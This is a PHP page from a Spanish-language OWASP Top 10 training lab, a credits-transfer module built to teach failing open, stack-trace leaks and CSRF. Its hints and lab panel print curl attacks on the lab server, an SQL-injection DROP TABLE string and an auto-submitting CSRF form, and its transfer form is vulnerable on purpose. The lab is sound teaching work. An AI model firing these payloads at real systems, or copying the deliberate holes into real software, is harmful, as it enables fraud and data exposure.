<?php
/**
 * OWASP Top 10 Labs 2025 - A10: Mishandling of Exceptional Conditions
 * Modulo: Transferir Creditos
 * 
 * Este archivo muestra la interfaz de transferencias de creditos.
 * La vulnerabilidad esta en transferir.php que maneja mal las excepciones:
 * 1. Failing open: responde "success" aunque la operacion haya fallado
 * 2. Stack trace: expone informacion interna en errores
 */

session_start();

// Simular usuario logueado (alice)
$_SESSION['user_id'] = $_SESSION['user_id'] ?? 2;
$_SESSION['username'] = $_SESSION['username'] ?? 'alice';

// Generar token CSRF para la versión segura
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

require_once __DIR__ . '/../config/db.php';

$pageTitle = 'Transferir Creditos - Nexo';

// Info del lab para el panel lateral
$labInfo = [
    'id' => 'A10:2025',
    'name' => 'Mishandling of Exceptional Conditions',
    'difficulty' => 'Avanzada',
    'description' => '
        <p>El modulo de transferencias tiene <strong>tres vulnerabilidades</strong>:</p>
        <ol>
            <li><strong>Failing open:</strong> Si algo falla, responde "success" igual</li>
            <li><strong>Stack trace:</strong> Expone credenciales en errores</li>
            <li><strong>CSRF (bonus):</strong> No valida origen del request</li>
        </ol>
        <p class="mb-0"><small>CSRF es historico (fuera del Top 10) pero pedagogicamente relevante.</small></p>
    ',
    'exploit' => '# 1. Failing open - enviar user_id invalido contra la VPS
curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \\
  -d "to_user=999&amount=100"
# Responde "success" aunque el usuario no exista

# 2. Stack trace - provocar error de SQL
curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \\
  -d "to_user=\'; DROP TABLE wallets--&amount=100"
# El stack trace muestra credenciales de la BD

# 3. CSRF - sitio malicioso auto-envia el form:
&lt;form action=".../transferir.php" method="POST"&gt;
  &lt;input name="to_user" value="666"&gt;
  &lt;input name="amount" value="50000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
    'prevention' => '// 1. Fail closed (no "success" en catch)
// 2. Sin stack trace (log interno, msg generico)
// 3. Token CSRF obligatorio:

if (!hash_equals($_SESSION[\'csrf_token\'], $_POST[\'csrf_token\'])) {
    http_response_code(403);
    exit(json_encode(["error" => "CSRF invalid"]));
}',
    'caseStudy' => [
        'title' => 'Knight Capital Group (2012)',
        'description' => 'Una excepcion no manejada en trading algoritmico causo compras/ventas erraticas por 45 minutos. Perdida: $440 millones. La empresa quebro dias despues.'
    ],
    'cwes' => ['CWE-636', 'CWE-209', 'CWE-703', 'CWE-352'],
    'tools' => ['curl', 'Burp Suite'],
];

// Obtener balance del usuario
try {
    $pdo = getDbConnection();
    $stmt = $pdo->prepare("SELECT balance FROM wallets WHERE user_id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $wallet = $stmt->fetch();
    $balance = $wallet ? $wallet['balance'] : 0;
    
    // Obtener usuarios disponibles para transferir
    $stmt = $pdo->prepare("SELECT id, username FROM users WHERE id != ?");
    $stmt->execute([$_SESSION['user_id']]);
    $users = $stmt->fetchAll();
    
    // Obtener historial de transferencias
    $stmt = $pdo->prepare("
        SELECT t.*, 
               uf.username as from_username,
               ut.username as to_username
        FROM transfers t
        JOIN users uf ON t.from_user_id = uf.id
        JOIN users ut ON t.to_user_id = ut.id
        WHERE t.from_user_id = ? OR t.to_user_id = ?
        ORDER BY t.created_at DESC
        LIMIT 10
    ");
    $stmt->execute([$_SESSION['user_id'], $_SESSION['user_id']]);
    $transfers = $stmt->fetchAll();
    
} catch (PDOException $e) {
    $balance = 0;
    $users = [];
    $transfers = [];
    $error = "Error al cargar datos";
}

// Mensaje de resultado si viene de una transferencia
$result = $_GET['result'] ?? null;
$resultMessage = $_GET['message'] ?? null;

include __DIR__ . '/../shared/header.php';
?>

<main class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h1 class="h3 mb-1">Transferir Creditos</h1>
            <p class="text-muted mb-0">
                Logueado como: <strong><?= htmlspecialchars($_SESSION['username']) ?></strong>
            </p>
        </div>
        <a href="/" class="btn btn-outline-secondary">Volver al inicio</a>
    </div>

    <?php if ($result): ?>
    <div class="alert alert-<?= $result === 'success' ? 'success' : 'danger' ?>">
        <?= htmlspecialchars($resultMessage ?? ($result === 'success' ? 'Transferencia completada' : 'Error en la transferencia')) ?>
    </div>
    <?php endif; ?>

    <div class="row">
        <div class="col-md-8">
            <!-- Formulario de transferencia -->
            <div class="card mb-4">
                <div class="card-header bg-white d-flex justify-content-between">
                    <strong>Nueva Transferencia</strong>
                    <span class="badge bg-primary">Balance: $<?= number_format($balance, 0, ',', '.') ?></span>
                </div>
                <div class="card-body">
                    <!-- Tabs para elegir version -->
                    <ul class="nav nav-tabs mb-3" role="tablist">
                        <li class="nav-item">
                            <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#vulnerable" type="button">
                                <span class="text-danger">🔓 Vulnerable</span>
                            </button>
                        </li>
                        <li class="nav-item">
                            <button class="nav-link" data-bs-toggle="tab" data-bs-target="#seguro" type="button">
                                <span class="text-success">🔒 Seguro</span>
                            </button>
                        </li>
                    </ul>
                    
                    <div class="tab-content">
                        <!-- Form VULNERABLE (sin CSRF token) -->
                        <div class="tab-pane fade show active" id="vulnerable">
                            <div class="alert alert-danger small py-2">
                                <strong>Sin proteccion CSRF</strong> — Un sitio malicioso podria enviar este form.
                            </div>
                            <form action="transferir.php" method="POST" id="transferFormVuln">
                                <div class="mb-3">
                                    <label for="to_user_vuln" class="form-label">Destinatario</label>
                                    <select class="form-select" id="to_user_vuln" name="to_user" required>
                                        <option value="">Selecciona un usuario...</option>
                                        <?php foreach ($users as $user): ?>
                                        <option value="<?= $user['id'] ?>"><?= htmlspecialchars($user['username']) ?> (ID: <?= $user['id'] ?>)</option>
                                        <?php endforeach; ?>
                                        <option value="999">Usuario inexistente (ID: 999)</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="amount_vuln" class="form-label">Monto</label>
                                    <div class="input-group">
                                        <span class="input-group-text">$</span>
                                        <input type="number" class="form-control" id="amount_vuln" name="amount" 
                                               min="1" max="<?= $balance ?>" required>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger w-100">
                                    Transferir (vulnerable)
                                </button>
                            </form>
                        </div>
                        
                        <!-- Form SEGURO (con CSRF token) -->
                        <div class="tab-pane fade" id="seguro">
                            <div class="alert alert-success small py-2">
                                <strong>Con token CSRF</strong> — Solo acepta requests de este formulario.
                                <br><code class="small">Token: <?= substr($_SESSION['csrf_token'], 0, 16) ?>...</code>
                            </div>
                            <form action="transferir_secure.php" method="POST" id="transferFormSecure">
                                <!-- Token CSRF oculto -->
                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
                                
                                <div class="mb-3">
                                    <label for="to_user_sec" class="form-label">Destinatario</label>
                                    <select class="form-select" id="to_user_sec" name="to_user" required>
                                        <option value="">Selecciona un usuario...</option>
                                        <?php foreach ($users as $user): ?>
                                        <option value="<?= $user['id'] ?>"><?= htmlspecialchars($user['username']) ?> (ID: <?= $user['id'] ?>)</option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="amount_sec" class="form-label">Monto</label>
                                    <div class="input-group">
                                        <span class="input-group-text">$</span>
                                        <input type="number" class="form-control" id="amount_sec" name="amount" 
                                               min="1" max="<?= $balance ?>" required>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-success w-100">
                                    Transferir (seguro)
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Historial -->
            <div class="card">
                <div class="card-header bg-white">
                    <strong>Historial de transferencias</strong>
                </div>
                <div class="table-responsive">
                    <table class="table table-hover mb-0">
                        <thead class="table-light">
                            <tr>
                                <th>ID</th>
                                <th>De</th>
                                <th>Para</th>
                                <th>Monto</th>
                                <th>Estado</th>
                                <th>Fecha</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($transfers as $t): ?>
                            <tr>
                                <td><code>#<?= $t['id'] ?></code></td>
                                <td><?= htmlspecialchars($t['from_username']) ?></td>
                                <td><?= htmlspecialchars($t['to_username']) ?></td>
                                <td>$<?= number_format($t['amount'], 0, ',', '.') ?></td>
                                <td>
                                    <?php
                                    $statusColors = [
                                        'completada' => 'success',
                                        'pendiente' => 'warning',
                                        'fallida' => 'danger',
                                        'revertida' => 'secondary'
                                    ];
                                    $color = $statusColors[$t['status']] ?? 'secondary';
                                    ?>
                                    <span class="badge bg-<?= $color ?>"><?= $t['status'] ?></span>
                                </td>
                                <td><small><?= date('d/m H:i', strtotime($t['created_at'])) ?></small></td>
                            </tr>
                            <?php endforeach; ?>
                            <?php if (empty($transfers)): ?>
                            <tr>
                                <td colspan="6" class="text-center text-muted">Sin transferencias</td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div class="col-md-4">
            <!-- Hint del lab -->
            <div class="card border-warning mb-4">
                <div class="card-header bg-warning">
                    Pistas del lab
                </div>
                <div class="card-body small">
                    <h6>1. Failing Open:</h6>
                    <p>Selecciona "Usuario inexistente (ID: 999)" y envia con el form vulnerable. 
                    Respondera "success" aunque el usuario no exista.</p>
                    
                    <h6>2. Stack Trace:</h6>
                    <pre class="bg-light p-2"><code>curl -X POST \
  https://nexolab.guajilodev.com/a10_pagos/transferir.php \
  -d "to_user='; DROP--&amount=100"</code></pre>
                    
                    <h6>3. CSRF:</h6>
                    <p class="mb-1">Crea un HTML con este form y abrilo:</p>
                    <pre class="bg-light p-2"><code>&lt;form action="https://nexolab.guajilodev.com/a10_pagos/transferir.php" 
  method="POST"&gt;
  &lt;input name="to_user" value="1"&gt;
  &lt;input name="amount" value="100"&gt;
  &lt;button&gt;Click&lt;/button&gt;
&lt;/form&gt;</code></pre>
                    <p class="mb-0 text-muted">Si tenes sesion activa, transfiere sin tu consentimiento.</p>
                </div>
            </div>
            
            <!-- Comparacion -->
            <div class="row g-3">
                <div class="col-12">
                    <div class="card border-danger">
                        <div class="card-header bg-danger text-white">
                            Vulnerable
                        </div>
                        <div class="card-body">
                            <p class="small mb-2">El formulario envia a:</p>
                            <code>transferir.php</code>
                            <p class="small text-muted mt-2 mb-0">
                                Failing open + stack trace
                            </p>
                        </div>
                    </div>
                </div>
                <div class="col-12">
                    <div class="card border-success">
                        <div class="card-header bg-success text-white">
                            Seguro
                        </div>
                        <div class="card-body">
                            <a href="transferir_secure.php?demo=1" class="btn btn-outline-success btn-sm w-100">
                                Probar transferir_secure.php
                            </a>
                            <p class="small text-muted mt-2 mb-0">
                                Manejo correcto de excepciones
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>

<?php 
include __DIR__ . '/../shared/lab_panel.php';
include __DIR__ . '/../shared/footer.php'; 
?>
